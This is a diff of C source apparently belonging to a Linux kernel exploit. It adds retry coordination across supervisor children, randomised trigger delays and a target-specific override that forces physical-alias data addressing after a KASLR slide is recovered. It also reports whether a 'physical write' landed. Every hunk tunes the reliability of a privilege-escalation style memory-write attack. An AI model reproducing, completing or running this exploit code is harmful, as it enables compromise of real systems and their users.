@@ -2178,6 +2178,9 @@ static int slide_trigger_physical_state_report(int report_status) {
   int status = 0;
   SYSCHK(waitpid(child, &status, 0));
   int ok = WIFEXITED(status) && WEXITSTATUS(status) == 0;
+#if defined(APP_FOPS_RETRY_BUDGET) && APP_FOPS_RETRY_BUDGET > 1
+  app_publish_write_landed(ok);
+#endif
   if (report_status) {
     pr_info("p0 physical write status=%d ok=%d\n", status, ok);
   }
@@ -2331,7 +2334,12 @@ int app_trigger_fops_oracle_slot(size_t slot) {
 #endif
 #else
 int app_trigger_fops_slide_route(void) {
+#if defined(APP_FOPS_RETRY_BUDGET) && APP_FOPS_RETRY_BUDGET > 1
+  /* Shared across supervisor children so each shot draws a new delay. */
+  size_t delay_index = (size_t)app_route_delay_next_index();
+#else
   static size_t delay_index;
+#endif
   static const int delays[] = {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
@@ -2823,12 +2831,23 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
   kaslr_slide = slide;
   slide_p0_offset = slide;
   kaslr_done = 1;
+#if defined(APP_TRACEFS_PHYS_ALIAS_DATA) && APP_TRACEFS_PHYS_ALIAS_DATA
+  /*
+   * Target override: data addressing uses the physical-load alias no
+   * matter where the slide came from. On this build canonical direct-map
+   * writes never land (window=0 across boots) while phys-alias writes
+   * succeed, so a tracefs-derived slide must not switch addressing mode.
+   */
+  data_addr_canonical = 0;
+  app_publish_p0_offset(slide_p0_offset);
+#else
   data_addr_canonical = strcmp(source, "tracefs") == 0;
   if (data_addr_canonical) {
     app_publish_slide_ready();
   } else {
     app_publish_p0_offset(slide_p0_offset);
   }
+#endif
   pr_success("slide-kaslr-ok source=%s pid=%d base=%016llx "
              "slide=%016llx data_mode=%s\n",
              source, getpid(), (unsigned long long)kaslr_base,
